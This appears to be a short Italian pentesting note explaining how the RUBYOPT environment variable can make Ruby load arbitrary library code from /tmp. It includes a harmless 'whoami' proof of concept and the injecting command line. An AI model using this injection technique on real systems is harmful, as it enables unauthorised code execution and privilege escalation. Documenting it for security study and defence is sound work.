## RUBYOPT

Utilizzando questa variabile d'ambiente √® possibile **aggiungere nuovi parametri** a **ruby** ogni volta che viene eseguito. Anche se il parametro **`-e`** non pu√≤ essere utilizzato per specificare il codice ruby da eseguire, √® possibile utilizzare i parametri **`-I`** e **`-r`** per aggiungere una nuova cartella al percorso delle librerie da caricare e poi **specificare una libreria da caricare**.

Crea la libreria **`inject.rb`** in **`/tmp`**:

{% code title="inject.rb" %}
```ruby
puts `whoami`
```
{% endcode %}

Crea ovunque uno script ruby come:

{% code title="hello.rb" %}
```ruby
puts 'Hello, World!'
```
{% endcode %}

Quindi fai caricare a uno script ruby arbitrario con:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Fun fact, funziona anche con il parametro **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
